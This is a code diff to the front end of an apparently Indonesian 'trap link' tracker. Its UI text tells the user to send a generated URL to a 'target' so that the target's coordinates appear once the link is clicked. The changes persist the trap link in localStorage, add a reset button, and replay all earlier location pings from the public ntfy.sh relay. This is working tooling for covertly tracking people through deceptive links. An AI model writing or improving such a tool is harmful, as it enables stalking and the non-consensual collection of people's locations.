@@ -59,6 +59,7 @@
             letter-spacing: -2px;
             background: linear-gradient(90deg, var(--primary), var(--accent));
             -webkit-background-clip: text;
+            background-clip: text;
             -webkit-text-fill-color: transparent;
             text-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
         }
@@ -381,8 +382,13 @@
                     <p style="font-size:0.9rem; color:var(--text-dim);">Kirim URL jebakan di bawah ini ke target. Jangan
                         tutup halaman ini, kalo diklik koordinat akan muncul otomatis!</p>
 
-                    <div class="trap-linkbox" id="displayTrapLink" onclick="copyTrapLink()" style="cursor:pointer;"
-                        title="Klik Untuk Copy"></div>
+                    <div style="display:flex; gap:10px; margin-bottom: 1.5rem;">
+                        <div class="trap-linkbox" id="displayTrapLink" onclick="copyTrapLink()"
+                            style="cursor:pointer; flex: 1; margin: 0;" title="Klik Untuk Copy"></div>
+                        <button onclick="resetTracker()"
+                            style="background: rgba(255,0,85,0.2); color: var(--accent); border: 1px solid var(--accent); border-radius: 8px; cursor: pointer; padding: 0 15px; font-weight: bold;"><i
+                                data-lucide="power-off"></i></button>
+                    </div>
 
                     <div id="logsContainer">
                         <!-- Logs injected here -->
@@ -396,6 +402,29 @@
     <script>
         lucide.createIcons();
         let eventSource = null;
+
+        // Restore state on load if exists
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedTopic = localStorage.getItem('sintel_topic');
+            const savedTrapLink = localStorage.getItem('sintel_trap_link');
+            if (savedTopic && savedTrapLink) {
+                document.getElementById('setupView').style.display = 'none';
+                document.getElementById('dashboardView').style.display = 'block';
+                document.getElementById('displayTrapLink').innerText = savedTrapLink;
+                listenToDashboard(savedTopic);
+            }
+        });
+
+        function resetTracker() {
+            localStorage.removeItem('sintel_topic');
+            localStorage.removeItem('sintel_trap_link');
+            if (eventSource) eventSource.close();
+
+            document.getElementById('setupView').style.display = 'block';
+            document.getElementById('dashboardView').style.display = 'none';
+            document.getElementById('displayTrapLink').innerText = '';
+            document.getElementById('logsContainer').innerHTML = '';
+        }
 
         function switchTab(panelId, element) {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
@@ -436,17 +465,19 @@
 
         function generateTracker() {
             const target = document.getElementById('targetUrlInput').value;
-            // Buat room random unik u/ tracking (Pub/Sub via ntfy stateless)
             const topicId = 'sintel_' + Math.random().toString(36).substring(2, 10);
             const tBase = btoa(target);
 
             const trapLink = `${window.location.origin}/api/trap?topic=${topicId}&t=${tBase}`;
 
+            // Save state
+            localStorage.setItem('sintel_topic', topicId);
+            localStorage.setItem('sintel_trap_link', trapLink);
+
             document.getElementById('setupView').style.display = 'none';
             document.getElementById('dashboardView').style.display = 'block';
             document.getElementById('displayTrapLink').innerText = trapLink;
 
-            // Start Listening ke jaringan ntfy
             listenToDashboard(topicId);
         }
 
@@ -458,7 +489,11 @@
         function listenToDashboard(topic) {
             if (eventSource) eventSource.close();
             // Connect to free Ntfy SSE Push Notification server
-            eventSource = new EventSource(`https://ntfy.sh/${topic}/sse`);
+            // ?since=all will fetch all previous pings even after we refresh the page!
+            eventSource = new EventSource(`https://ntfy.sh/${topic}/sse?since=all`);
+
+            // Clear container before loading all to prevent duplicates if function called twice
+            document.getElementById('logsContainer').innerHTML = '';
 
             eventSource.addEventListener('message', (e) => {
                 const data = JSON.parse(e.data);
